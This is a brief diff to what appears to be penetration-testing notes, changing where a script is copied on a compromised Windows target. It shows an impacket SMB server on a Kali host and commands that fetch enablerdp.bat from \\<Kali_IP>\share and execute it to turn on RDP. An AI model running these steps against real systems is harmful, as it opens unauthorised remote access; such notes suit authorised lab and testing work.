@@ -31,8 +31,8 @@ impacket-smbserver share $(pwd) -smb2support
 
 On the target copy the file and execute it.
 ```
-xcopy \\<Kali_IP>\share\enablerdp.bat C:\Users\Administrator\Desktop\
-C:\Users\Administrator\Desktop\enablerdp.bat
+xcopy \\<Kali_IP>\share\enablerdp.bat C:\Temp\
+C:\Temp\enablerdp.bat
 ```
 
 
